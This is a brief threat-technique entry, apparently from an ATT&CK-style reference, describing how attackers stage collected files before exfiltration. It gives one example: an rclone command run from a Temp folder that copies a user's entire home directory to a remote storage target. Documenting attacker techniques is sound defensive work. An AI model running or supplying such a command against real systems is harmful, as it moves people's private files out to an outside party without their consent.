## Tactic: Collection

### Technique: Local Data Staging

Threat actors often use this technique to avoid detection by keeping all files in a centralized folder locally, in the cloud, or remotely before exfiltration.

---

**Example:**

_Remote file transfer tool_ `rclone` communicating:

```bash
C:\Users\jamesmurphy\AppData\Local\Temp\rclone.exe copy C:\Users\Jamesmurphy\ remote2:/home/cyborgbob/Documents/MegaTraining/FileCollection/Rclone/
